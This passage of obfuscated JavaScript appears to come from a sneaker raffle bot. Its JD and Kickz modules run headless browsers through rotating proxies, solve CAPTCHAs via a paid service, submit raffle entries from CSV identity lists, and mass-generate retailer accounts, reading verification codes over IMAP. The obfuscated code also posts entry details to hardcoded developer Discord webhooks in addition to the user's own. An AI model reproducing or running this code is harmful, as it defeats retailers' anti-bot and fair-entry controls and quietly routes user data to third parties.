                        _0x30e6c8['errorDEV'] = { 'embeds': [_0x3e8875] }, _0x5b5c1b['webhook'] != undefined && _0x5b5c1b['webhook'] != '' && await _0x3b1b09(_0x5b5c1b['webhook'], _0x30e6c8['errorDEV']), await _0x3b1b09(_0x57f30c, _0x30e6c8['errorDEV']), _0x5000e2 = 'yes';
                    } finally {
                        _0x14430e['close']();
                        if (_0x5000e2 == 'yes' && _0x4a9cd4 != 0x5) {
                            console['log'](_0x1ee8dd['red'](_0x235b96() + '\x20[' + _0x44ebd1['name'] + ']\x20Task\x20' + (_0x479ed1 + 0x1) + '\x20:\x20Retrying\x20(' + _0x4a9cd4 + '\x20/\x205)')), _0x479ed1 = _0x479ed1 - 0x1, _0x4a9cd4 = _0x4a9cd4 + 0x1;
                            continue;
                        }
                        console['log']('Waiting\x20for\x20' + _0x5b5c1b['footshopDelay'] + '\x20ms'), await _0x101cd5(_0x5b5c1b['footshopDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png',
            'function': async function (_0x35b290, _0xb75c1, _0x7aa8b8) {
                var _0x5dc5d1 = ![], _0x4be3e3 = ![];
                if (_0x5b5c1b['captchaKey'] == '' || _0x5b5c1b['captchaKey'] == undefined)
                    return console['log'](_0x1ee8dd['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
                _0x23c50c['use'](_0x9505fd()), _0x23c50c['use'](_0x1b94bb({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x5b5c1b['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x1bc51e = 0x0; _0x1bc51e < _0xb75c1['length']; _0x1bc51e++) {
                    if (_0x257dfb != 'yes')
                        var _0x257dfb = '', _0x2c8776 = 0x0;
                    var _0x3a26d6, _0x7e2d19 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20JD\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'Product',
                                'value': '' + _0xb75c1[_0x1bc51e]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0xb75c1[_0x1bc51e]['Size']
                            },
                            {
                                'name': 'User',
                                'value': '' + _0x5b6a98
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x5b5c1b['delay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x300b57
                            }
                        ]
                    }];
                    const _0x2ce9bf = { 'embeds': _0x7e2d19 };
                    _0x18a4ea(_0x35b290['name'] + '\x20Task\x20' + (_0x1bc51e + 0x1) + '\x20/\x20' + _0xb75c1['length'] + '\x20||\x20File:\x20' + _0x2e7789 + '\x20Proxies:\x20' + _0x34cb85);
                    try {
                        await _0x15925d(_0xb75c1, _0x1bc51e);
                    } catch {
                        _0x257dfb = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    var _0xd26462 = await _0x42c912(_0xb75c1[_0x1bc51e], _0x35b290, 'dev', ![]), _0x1b919e = await _0x42c912(_0xb75c1[_0x1bc51e], _0x35b290, 'pub', ![]);
                    const _0x4d6c97 = {
                        'succesDEVMSG': { 'embeds': [_0xd26462] },
                        'succesPUBMSG': { 'embeds': [_0x1b919e] }
                    };
                    if (_0x5b5c1b['webhook'] != undefined && _0x5b5c1b['webhook'] != '')
                        try {
                            await _0x3b1b09(_0x5b5c1b['webhook'], _0x4d6c97['succesDEVMSG']);
                        } catch {
                        }
                    await _0x101cd5(0xc8), await _0x3b1b09(_0x5748ab, _0x4d6c97['succesDEVMSG']), await _0x101cd5(0xc8);
                    try {
                        await _0x3b1b09(_0x155517, _0x4d6c97['succesPUBMSG']);
                    } catch {
                    }
                    if (_0xb75c1[_0x1bc51e]['Email'] == '' || _0xb75c1[_0x1bc51e]['Url'] == '' || _0xb75c1[_0x1bc51e]['FirstName'] == '' || _0xb75c1[_0x1bc51e]['LastName'] == '') {
                        console['log'](_0x235b96() + '\x20[' + _0x2db3d[taskModule]['name'] + ']\x20Task\x20' + (_0x1bc51e + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x5b5c1b['useRandomProxy'] = ![])
                        var _0x250bc6 = _0x7aa8b8[_0x1bc51e]['split'](':');
                    else
                        var _0x5cc7c7 = Math['round'](Math['random']() * (_0x7aa8b8['length'] - 0x1)), _0x250bc6 = _0x7aa8b8[_0x5cc7c7]['split'](':');
                    var _0xc1446;
                    try {
                        _0xc1446 = await _0x23c50c['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x250bc6[0x0] + ':' + _0x250bc6[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0xc1446 = await _0x23c50c['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x250bc6[0x0] + ':' + _0x250bc6[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x4849ce = await _0xc1446['newPage']();
                        await _0x4849ce['authenticate']({
                            'username': '' + _0x250bc6[0x2],
                            'password': '' + _0x250bc6[0x3]
                        }), console['log'](_0x235b96() + '\x20[' + _0x35b290['name'] + ']\x20Task\x20' + (_0x1bc51e + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4849ce['setRequestInterception'](!![]), _0x4849ce['on']('request', _0x3eec47 => {
                            _0x3eec47['resourceType']() === 'image' || _0x3eec47['resourceType']() === 'font' || _0x3eec47['resourceType']() === 'media' ? _0x3eec47['abort']() : _0x3eec47['continue']();
                        });
                        try {
                            await _0x4849ce['goto']('' + _0xb75c1[_0x1bc51e]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        try {
                            await _0x4849ce['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
                        } catch {
                            throw new Error('Not\x20an\x20Active\x20Raffle');
                        }
                        console['log'](_0x235b96() + '\x20[' + _0x35b290['name'] + ']\x20Task\x20' + (_0x1bc51e + 0x1) + '\x20:\x20Filling\x20Information'), await _0x4849ce['type']('#comp_firstname', '' + _0xb75c1[_0x1bc51e]['FirstName']), await _0x4849ce['waitForSelector']('#comp_lastname'), await _0x4849ce['type']('#comp_lastname', '' + _0xb75c1[_0x1bc51e]['LastName']), await _0x4849ce['waitForSelector']('#comp_email'), await _0x4849ce['type']('#comp_email', '' + _0xb75c1[_0x1bc51e]['Email']), await _0x4849ce['waitForSelector']('#comp_paypalemail'), await _0x4849ce['type']('#comp_paypalemail', '' + _0xb75c1[_0x1bc51e]['Email']), await _0x4849ce['waitForSelector']('#comp_mobile_end'), await _0x4849ce['type']('#comp_mobile_end', '' + _0xb75c1[_0x1bc51e]['Phone']), await _0x4849ce['waitForSelector']('#comp_dob'), await _0x4849ce['type']('#comp_dob', '08/09/1992'), console['log'](_0x235b96() + '\x20[' + _0x35b290['name'] + ']\x20Task\x20' + (_0x1bc51e + 0x1) + '\x20:\x20Choosing\x20Size');
                        if (_0xb75c1[_0x1bc51e]['Size'] == 'RANDOM') {
                            const _0x595412 = await _0x4849ce['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x24a216 => {
                                return _0x24a216['map'](_0xb72c9d => _0xb72c9d['value']);
                            });
                            var _0x5e8281 = Math['round'](Math['random']() * (_0x595412['length'] - 0x2));
                            await _0x4849ce['select']('#shoesize', _0x595412[_0x5e8281 + 0x1]), await _0x101cd5(0x3e8);
                        } else {
                            const _0x43e818 = await _0x4849ce['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x4a5e4b => {
                                return _0x4a5e4b['map'](_0x2ac190 => _0x2ac190['innerText']);
                            }), _0x27b72b = await _0x4849ce['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x5a9de9 => {
                                return _0x5a9de9['map'](_0x5944f4 => _0x5944f4['value']);
                            });
                            var _0x117283 = _0xb75c1[_0x1bc51e]['Size'];
                            for (var _0x47c6c0 = 0x1; _0x47c6c0 < _0x27b72b['length']; _0x47c6c0++) {
                                var _0x3956e7 = _0x43e818[_0x47c6c0]['split']('\x20')[0x0];
                                if (_0x3956e7 == _0x117283) {
                                    await _0x4849ce['select']('#shoesize', _0x27b72b[_0x47c6c0]);
                                    break;
                                } else {
                                    if (_0x47c6c0 + 0x1 == _0x27b72b['length'])
                                        throw new Error('Size\x20Not\x20Found..');
                                }
                            }
                        }
                        await _0x4849ce['waitForSelector']('#comp_address1'), await _0x4849ce['type']('#comp_address1', _0xb75c1[_0x1bc51e]['Address1'] + '\x20' + _0xb75c1[_0x1bc51e]['HouseNumber']), await _0x4849ce['waitForSelector']('#comp_address2'), await _0x4849ce['type']('#comp_address2', '' + _0xb75c1[_0x1bc51e]['Address2']), await _0x4849ce['waitForSelector']('#comp_address2'), await _0x4849ce['type']('#comp_address3', '' + _0xb75c1[_0x1bc51e]['City']), await _0x4849ce['waitForSelector']('#comp_postcode'), await _0x4849ce['type']('#comp_postcode', '' + _0xb75c1[_0x1bc51e]['Zip']), console['log'](_0x235b96() + '\x20[' + _0x35b290['name'] + ']\x20Task\x20' + (_0x1bc51e + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x101cd5(0x4b0), await _0x4849ce['click']('label#emailhold'), await _0x101cd5(0x5dc), await _0x4849ce['click']('#preauth_tandc_email\x20>\x20label'), await _0x101cd5(0x5dc), await _0x4849ce['click']('#submit');
                        try {
                            await _0x4849ce['waitForSelector']('#paymentWrap');
                        } catch {
                            throw new Error('Could\x20not\x20find\x20Payment');
                        }
                        console['log'](_0x235b96() + '\x20[' + _0x35b290['name'] + ']\x20Task\x20' + (_0x1bc51e + 0x1) + '\x20:\x20' + _0x1ee8dd['blue']('Awaiting\x20Paypal\x20Payment')), _0xc1446['on']('targetcreated', async _0x50c5d7 => {
                            if (_0x50c5d7['type']() === 'page') {
                                const _0x5617b7 = await _0x50c5d7['page']();
                                async function _0x16293b() {
                                    try {
                                        await _0x4849ce['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x4be3e3 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                async function _0x55bd92() {
                                    try {
                                        await _0x4849ce['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x5dc5d1 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                _0x55bd92(), _0x16293b(), await _0x101cd5(0x493e0);
                            }
                        });
                        async function _0x52b511() {
                            for (let _0x32d7fb = 0x0; _0x32d7fb < 0x12c; _0x32d7fb++) {
                                if (_0x5dc5d1 == !![]) {
                                    _0x257dfb = 'no', _0x30fd17(_0xb75c1[_0x1bc51e], _0x35b290), console['log'](_0x1ee8dd['green'](_0x235b96() + '\x20[' + _0x35b290['name'] + ']\x20Task\x20' + (_0x1bc51e + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                    if (_0x5b5c1b['webhook'] != undefined && _0x5b5c1b['webhook'] != '')
                                        try {
                                            await _0x3b1b09(_0x5b5c1b['webhook'], _0x4d6c97['succesDEVMSG']);
                                        } catch {
                                        }
                                    await _0x101cd5(0xc8), await _0x3b1b09(_0x5748ab, _0x4d6c97['succesDEVMSG']), await _0x101cd5(0xc8);
                                    try {
                                        await _0x3b1b09(_0x155517, _0x4d6c97['succesPUBMSG']);
                                    } catch {
                                    }
                                    return;
                                } else {
                                    if (_0x4be3e3)
                                        throw new Error('Paypal\x20Error:\x20Target\x20closed');
                                    else
                                        await _0x101cd5(0x3e8);
                                }
                            }
                            throw new Error('Paypal\x20Error');
                        }
                        await _0x101cd5(0xbb8), await _0x4849ce['click']('.zoid-outlet'), await _0x101cd5(0x7d0), await _0x52b511();
                    } catch (_0xe0a070) {
                        console['log'](_0x1ee8dd['red'](_0x235b96() + '\x20[' + _0x35b290['name'] + ']\x20Task\x20' + (_0x1bc51e + 0x1) + '\x20:\x20' + _0xe0a070)), _0x3a26d6 = '' + _0xe0a070;
                        var _0x4978c1 = await _0x42c912(_0xb75c1[_0x1bc51e], _0x35b290, 'dev', !![], _0x3a26d6);
                        _0x4d6c97['errorDEV'] = { 'embeds': [_0x4978c1] }, _0x5b5c1b['webhook'] != undefined && _0x5b5c1b['webhook'] != '' && await _0x3b1b09(_0x5b5c1b['webhook'], _0x4d6c97['errorDEV']), await _0x3b1b09(_0x57f30c, _0x4d6c97['errorDEV']);
                    } finally {
                        _0xc1446 && _0xc1446['close']();
                        if (_0x257dfb == 'yes' && _0x2c8776 != 0x5 && _0x3a26d6 != 'Size\x20Not\x20Found') {
                            console['log'](_0x1ee8dd['red'](_0x235b96() + '\x20[' + _0x35b290['name'] + ']\x20Task\x20' + (_0x1bc51e + 0x1) + '\x20:\x20Retrying\x20(' + _0x2c8776 + '\x20/\x205)')), _0x1bc51e = _0x1bc51e - 0x1, _0x2c8776 = _0x2c8776 + 0x1;
                            continue;
                        }
                        _0x257dfb == 'yes' && _0x2c8776 >= 0x5 && (_0x3802e1(afew[_0x1bc51e], _0x35b290), _0x257dfb = 'no', _0x2c8776 = 0x0), console['log']('Waiting\x20for\x20' + _0x5b5c1b['delay'] + '\x20ms'), await _0x101cd5(_0x5b5c1b['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x35912d, _0x1b0b56, _0x1cfee7) {
                    _0x23c50c['use'](_0x9505fd()), _0x23c50c['use'](_0x1b94bb({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5b5c1b['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x116177 = 0x0; _0x116177 < _0x1b0b56['length']; _0x116177++) {
                        const _0x4e0670 = 'https://www.kickz.com/login';
                        if (_0x101f24 != 'yes')
                            var _0x101f24 = '', _0x46f1ec = 0x0;
                        _0x18a4ea(_0x35912d['name'] + '\x20Task\x20' + (_0x116177 + 0x1) + '\x20/\x20' + _0x1b0b56['length'] + '\x20||\x20File:\x20' + _0x2e7789 + '\x20Proxies:\x20' + _0x34cb85);
                        try {
                            await _0x15925d(_0x1b0b56, _0x116177);
                        } catch {
                            _0x101f24 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x41d9f1 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x5b6a98
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x5b5c1b['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x300b57
                                }
                            ]
                        }];
                        const _0xa90c11 = { 'embeds': _0x41d9f1 };
                        var _0x3f7fdd = await _0x42c912(_0x1b0b56[_0x116177], _0x35912d, 'acc', ![]);
                        const _0x4b4451 = { 'succesDEVMSG': { 'embeds': [_0x3f7fdd] } };
                        if (_0x1b0b56[_0x116177]['Email'] == '' || _0x1b0b56[_0x116177]['FirstName'] == '' || _0x1b0b56[_0x116177]['LastName'] == '') {
                            console['log'](_0x235b96() + '\x20[' + _0x35912d['name'] + ']\x20Task\x20' + (_0x116177 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x1b0b56[_0x116177]['Password'] == '' && (_0x1b0b56[_0x116177]['Password'] = 'JRaffles23!');
                        if (_0x5b5c1b['useRandomProxy'] = ![])
                            var _0x2c3287 = _0x1cfee7[_0x116177]['split'](':');
                        else
                            var _0x16a646 = Math['round'](Math['random']() * (_0x1cfee7['length'] - 0x1)), _0x2c3287 = _0x1cfee7[_0x16a646]['split'](':');
                        var _0x26ac66;
                        try {
                            _0x26ac66 = await _0x23c50c['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x2c3287[0x0] + ':' + _0x2c3287[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x26ac66 = await _0x23c50c['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x2c3287[0x0] + ':' + _0x2c3287[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x4475e9 = await _0x26ac66['newPage']();
                            await _0x4475e9['authenticate']({
                                'username': '' + _0x2c3287[0x2],
                                'password': '' + _0x2c3287[0x3]
                            }), console['log'](_0x235b96() + '\x20[' + _0x35912d['name'] + ']\x20Task\x20' + (_0x116177 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4475e9['setRequestInterception'](!![]), _0x4475e9['on']('request', _0x3ea27e => {
                                _0x3ea27e['resourceType']() === 'image' || _0x3ea27e['resourceType']() === 'font' || _0x3ea27e['resourceType']() === 'media' ? _0x3ea27e['abort']() : _0x3ea27e['continue']();
                            }), await _0x4475e9['goto'](_0x4e0670), await _0x101cd5(0xbb8), console['log'](_0x235b96() + '\x20[' + _0x35912d['name'] + ']\x20Task\x20' + (_0x116177 + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x4475e9['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x4475e9['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x4475e9['waitForSelector']('#button-register'), await _0x101cd5(0x7d0), await _0x4475e9['evaluate'](() => {
                                const _0x1c00bb = document['querySelector']('#button-register');
                                _0x1c00bb['click']();
                            }), console['log'](_0x235b96() + '\x20[' + _0x35912d['name'] + ']\x20Task\x20' + (_0x116177 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x101cd5(0x1388), await _0x4475e9['waitForSelector']('#customer_salutation'), await _0x4475e9['select']('#customer_salutation', 'mr'), await _0x101cd5(0x7d0), await _0x4475e9['waitForSelector']('#customer_firstname'), await _0x4475e9['type']('#customer_firstname', '' + _0x1b0b56[_0x116177]['FirstName']), await _0x101cd5(0x352), await _0x4475e9['waitForSelector']('#customer_lastname'), await _0x4475e9['type']('#customer_lastname', '' + _0x1b0b56[_0x116177]['LastName']), await _0x101cd5(0x352), await _0x4475e9['type']('#email-input', '' + _0x1b0b56[_0x116177]['Email']), await _0x101cd5(0x352), await _0x4475e9['type']('#email-confirm-input', '' + _0x1b0b56[_0x116177]['Email']), await _0x101cd5(0x352), await _0x4475e9['type']('#register-password', '' + _0x1b0b56[_0x116177]['Password']), await _0x101cd5(0x352), await _0x4475e9['type']('#password-confirm', '' + _0x1b0b56[_0x116177]['Password']), await _0x101cd5(0x352), console['log'](_0x235b96() + '\x20[' + _0x35912d['name'] + ']\x20Task\x20' + (_0x116177 + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x4475e9['click']('#consent'), await _0x101cd5(0x1f4);
                            const _0x416275 = await _0x4475e9['$']('div.inputErrorMsg.b-form_section-message');
                            if (_0x416275) {
                                console['log'](_0x1ee8dd['red'](_0x235b96() + '\x20[' + _0x35912d['name'] + ']\x20Task\x20' + (_0x116177 + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                                continue;
                            }
                            await _0x4475e9['click']('#buttonRegister');
                            try {
                                await _0x4475e9['waitForSelector']('#verificationCode');
                            } catch {
                                throw new Error('Account\x20already\x20registered');
                            }
                            console['log'](_0x235b96() + '\x20[' + _0x35912d['name'] + ']\x20Task\x20' + (_0x116177 + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x1b0b56[_0x116177]['Email']), await _0x101cd5(0x4b0);
                            async function _0x4f108c() {
                                var _0x38dbc6, _0x42ca44 = ![];
                                for (var _0x4300b0 = 0x0; _0x4300b0 < 0x18; _0x4300b0++) {
                                    async function _0x12e6fc() {
                                        var _0x54f5d5 = new _0x3a8843({
                                            'user': _0x5b5c1b['masterMail'],
                                            'password': _0x5b5c1b['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x5882fb(_0x5cdb52) {
                                            _0x54f5d5['openBox']('INBOX', ![], _0x5cdb52);
                                        }
                                        _0x54f5d5['once']('ready', function () {
                                            console['log'](_0x235b96() + '\x20[' + _0x35912d['name'] + ']\x20Task\x20' + (_0x116177 + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x5882fb(function (_0x4f3e64, _0x8f46e8) {
                                                console['log'](_0x235b96() + '\x20[' + _0x35912d['name'] + ']\x20Task\x20' + (_0x116177 + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x4f3e64)
                                                    throw _0x4f3e64;
                                                _0x54f5d5['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'verification@kickz.com'
                                                    ]
                                                ], function (_0xe91461, _0x1ee178) {
                                                    if (!_0x1ee178 || !_0x1ee178['length'])
                                                        console['log'](_0x235b96() + '\x20[' + _0x35912d['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x54f5d5['end']();
                                                    else {
                                                        var _0x27b456 = _0x54f5d5['seq']['fetch'](_0x1ee178, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x27b456['on']('message', function (_0x403a7b, _0x45b974) {
                                                            var _0xcaf5bb = '(#' + _0x45b974 + ')\x20';
                                                            _0x403a7b['on']('body', function (_0x37a249, _0x349f7c) {
                                                                _0xbb5a33(_0x37a249, (_0x167877, _0x49e105) => {
                                                                    if (_0x49e105['subject'] == 'Kickz\x20Account\x20Verification\x20Code') {
                                                                        var _0x131a2a = _0x49e105['html']['split']('<div\x20style=\x22display:block;font-family:Arial,sans-serif;font-size:\x2030px;font-weight:\x20600;line-height:24px;color:#333333\x22>'), _0x2eb753 = _0x131a2a[0x1]['split']('<')[0x0];
                                                                        _0x38dbc6 = _0x2eb753;
                                                                    }
                                                                });
                                                            }), _0x403a7b['once']('end', function () {
                                                            });
                                                        }), _0x27b456['once']('error', function (_0x468ea7) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x27b456['once']('end', function () {
                                                            _0x54f5d5['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x54f5d5['once']('error', function (_0x40029e) {
                                            console['log'](_0x1ee8dd['red'](_0x40029e['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x42ca44 = !![];
                                        }), _0x54f5d5['once']('end', async function () {
                                        }), _0x54f5d5['connect']();
                                    }
                                    _0x12e6fc(), await _0x101cd5(0x1388);
                                    if (_0x38dbc6)
                                        return _0x38dbc6;
                                    if (_0x42ca44)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x4300b0 == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x4f108c(), _0x101cd5(0x320), console['log'](_0x235b96() + '\x20[' + _0x35912d['name'] + ']\x20Task\x20' + (_0x116177 + 0x1) + '\x20:\x20Verifying..'), await _0x4475e9['type']('#verificationCode', code), await _0x101cd5(0x1f4), await _0x4475e9['click']('#buttonVerify'), await _0x101cd5(0x190), await _0x4475e9['click']('#buttonVerify'), await _0x101cd5(0x3e8);
                            try {
                                await _0x4475e9['waitForSelector']('div.b-user_greeting'), _0x101f24 = 'no', console['log'](_0x1ee8dd['green'](_0x235b96() + '\x20[' + _0x35912d['name'] + ']\x20Task\x20' + (_0x116177 + 0x1) + '\x20:\x20Account\x20' + _0x1b0b56[_0x116177]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x467c3c['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x1b0b56[_0x116177]['Email'] + ',' + _0x1b0b56[_0x116177]['Password'] + ','), console['log'](_0x235b96() + '\x20[' + _0x35912d['name'] + ']\x20Task\x20' + (_0x116177 + 0x1) + '\x20:\x20Account\x20' + _0x1b0b56[_0x116177]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                                try {
                                    _0x5b5c1b['webhook'] != undefined && _0x5b5c1b['webhook'] != '' && await _0x3b1b09(_0x5b5c1b['webhook'], _0x4b4451['succesDEVMSG']);
                                } catch {
                                }
                                await _0x3b1b09(_0x2caac5, _0x4b4451['succesDEVMSG']);
                            } catch {
                                _0x101f24 = 'no', console['log'](_0x1ee8dd['red'](_0x235b96() + '\x20[' + _0x35912d['name'] + ']\x20Task\x20' + (_0x116177 + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0x1ee8dd['red'](_0x235b96() + '\x20[' + _0x35912d['name'] + ']\x20Task\x20' + (_0x116177 + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
                            }
                        } catch (_0x1b7e7a) {
                            console['log'](_0x1ee8dd['red'](_0x235b96() + '\x20[' + _0x35912d['name'] + ']\x20Task\x20' + (_0x116177 + 0x1) + '\x20:\x20' + _0x1b7e7a)), _0x41d9f1[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x41d9f1[0x0]['description'] = '' + _0x1b7e7a, await _0x3b1b09(_0x57f30c, _0xa90c11), _0x101f24 = 'yes';
                        } finally {
                            _0x26ac66 && _0x26ac66['close']();
                            if (_0x101f24 == 'yes' && _0x46f1ec != 0x5) {
                                console['log'](_0x1ee8dd['red'](_0x235b96() + '\x20[' + _0x35912d['name'] + ']\x20Task\x20' + (_0x116177 + 0x1) + '\x20:\x20Retrying\x20(' + _0x46f1ec + '\x20/\x205)')), _0x116177 = _0x116177 - 0x1, _0x46f1ec = _0x46f1ec + 0x1;
                                continue;
                            }
                            _0x101f24 == 'yes' && _0x46f1ec >= 0x5 && (_0x3802e1(_0x1b0b56[_0x116177], _0x35912d), _0x101f24 = 'no', _0x46f1ec = 0x0), console['log']('Waiting\x20for\x20' + _0x5b5c1b['delay'] + '\x20ms'), await _0x101cd5(_0x5b5c1b['delay']);
                        }
                    }
                }
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x241600, _0x2f1cfe, _0xf69c7e) {
                    _0x23c50c['use'](_0x9505fd()), _0x23c50c['use'](_0x1b94bb({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5b5c1b['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x3a44cd = 0x0; _0x3a44cd < _0x2f1cfe['length']; _0x3a44cd++) {
                        var _0x52b5be;
                        if (_0x46b19d != 'yes')
                            var _0x46b19d = '', _0x1461ce = 0x0;
                        _0x18a4ea(_0x241600['name'] + '\x20Task\x20' + (_0x3a44cd + 0x1) + '\x20/\x20' + _0x2f1cfe['length'] + '\x20||\x20File:\x20' + _0x2e7789 + '\x20Proxies:\x20' + _0x34cb85);
                        var _0x26f1bd = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Entry',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x5b6a98
                                },
                                {
                                    'name': 'Product',
                                    'value': '' + _0x2f1cfe[_0x3a44cd]['Url']
                                },
                                {
                                    'name': 'Size',
                                    'value': '' + _0x2f1cfe[_0x3a44cd]['Size']
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x5b5c1b['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x300b57
                                }
                            ]
                        }], _0xa7b787 = await _0x42c912(_0x2f1cfe[_0x3a44cd], _0x241600, 'dev', ![]), _0x493236 = await _0x42c912(_0x2f1cfe[_0x3a44cd], _0x241600, 'pub', ![]);
                        const _0x11ee85 = {
                            'succesDEVMSG': { 'embeds': [_0xa7b787] },
                            'succesPUBMSG': { 'embeds': [_0x493236] }
                        };
                        try {
                            await _0x15925d(_0x2f1cfe, _0x3a44cd);
                        } catch {
                            _0x46b19d = 'no';
